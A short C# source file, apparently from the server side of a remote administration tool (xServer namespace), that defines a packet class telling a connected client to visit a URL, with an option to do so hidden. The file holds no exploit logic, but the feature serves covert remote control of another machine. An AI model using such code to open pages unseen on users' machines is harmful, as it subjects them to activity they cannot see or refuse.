﻿using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoVisitWebsite : IPacket
    {
        public string URL { get; set; }

        public bool Hidden { get; set; }

        public DoVisitWebsite()
        {
        }

        public DoVisitWebsite(string url, bool hidden)
        {
            this.URL = url;
            this.Hidden = hidden;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}